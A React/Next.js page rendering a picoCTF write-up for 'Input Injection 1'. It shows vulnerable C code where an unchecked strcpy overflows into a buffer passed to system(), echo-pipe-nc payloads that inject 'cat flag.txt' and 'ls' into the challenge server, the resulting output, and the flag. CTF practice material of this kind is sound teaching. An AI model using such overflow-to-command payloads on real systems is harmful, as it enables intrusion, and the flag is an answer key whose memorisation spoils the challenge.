import Image from 'next/image'

export default function InputInjection1() {
  return (
    <div className="space-y-8">
      {/* Header Section */}
      <div className="bg-gradient-to-r from-red-50 to-pink-100 rounded-2xl p-8 border-l-4 border-red-500">
        <h1 className="text-4xl font-bold text-gray-900 mb-4">Input Injection 1</h1>
        <p className="text-xl text-gray-700 leading-relaxed">
          A friendly program wants to greet you… but its goodbye might say more than it should. 
          Can you convince it to reveal the flag?
        </p>
      </div>

      {/* Information Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Information Given</h2>
        
        <div className="space-y-6">
          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Description</h3>
            <p className="text-gray-700 leading-relaxed text-lg">
              A friendly program wants to greet you… but its goodbye might say more than it should. 
              Can you convince it to reveal the flag?
            </p>
            <p className="mt-4 text-gray-600">
              Additional details will be available after launching your challenge instance.
            </p>
          </div>

          <div>
            <h3 className="text-2xl font-bold text-green-700 mb-4">Hints</h3>
            <ul className="space-y-2 text-gray-700">
              <li>• Look closely at how the program stores and uses your input.</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Source Code Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Source Code (`vuln.c`)</h2>
        
        <div className="bg-gray-800 rounded-lg p-6">
          <pre className="text-green-400 font-mono text-sm">
{`void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];
    
    strcpy(c, cmd);
    strcpy(buffer, name); // VULNERABLE: No bounds checking
    
    printf("Goodbye, %s!\\n", buffer);
    
    fflush(stdout);
    system(c); // Executes our overwritten command
}`}
          </pre>
        </div>
      </div>

      {/* Vulnerability Section */}
      <div className="bg-white rounded-xl shadow-lg p-8 border border-gray-200">
        <h2 className="text-3xl font-bold text-blue-900 mb-6 border-l-4 border-blue-500 pl-4">Vulnerability</h2>
        <p className="text-gray-700 leading-relaxed mb-4">
          <code className="bg-red-100 text-red-800 px-2 py-1 rounded font-mono">strcpy(buffer, name)</code> on line 25.
        </p>
        <p className="text-gray-700 leading-relaxed">
          No bounds checking allows overflow of <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">buffer[10]</code> into adjacent <code className="bg-gray-100 text-gray-800 px-2 py-1 rounded font-mono">c[10]</code> array
        </p>
      </div>

      {/* Exploit Payloads Section */}
      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 rounded-xl p-8 border border-orange-200">
        <h2 className="text-3xl font-bold text-orange-900 mb-6">Exploit Payloads</h2>
        <div className="bg-gray-900 rounded-lg p-6 text-green-400 font-mono shadow-2xl">
          <div className="space-y-2">
            <div><code># Get the flag</code></div>
            <div><code>echo "AAAAAAAAAAcat flag.txt" | nc saffron-estate.picoctf.net 49685</code></div>
            <div className="mt-4"><code># List directory contents</code></div>
            <div><code>echo "AAAAAAAAAAls" | nc saffron-estate.picoctf.net 49685</code></div>
          </div>
        </div>
      </div>

      {/* Exploitation Section */}
      <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-xl p-8 text-green-400 shadow-2xl">
        <h2 className="text-3xl font-bold text-white mb-6">Exploitation</h2>
        <div className="bg-gray-800 rounded-lg p-6">
          <pre className="text-green-400 font-mono text-sm">
{`$ echo "AAAAAAAAAAcat flag.txt" | nc saffron-estate.picoctf.net 49685
What is your name?
Goodbye, AAAAAAAAAAcat flag.txt!
{"picoCTF{" + "0v3rfl0w_c0mm4nd_d3eb7161" + "}"}`}
          </pre>
        </div>
      </div>

      {/* Flag Section */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-8 border-l-4 border-green-500">
        <h2 className="text-3xl font-bold text-green-800 mb-6">Flag</h2>
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-xl font-mono text-xl font-bold shadow-lg">
          {"picoCTF{" + "'{'" + "}"}0v3rfl0w_c0mm4nd_d3eb7161{'}'}
        </div>
      </div>
    </div>
  )
}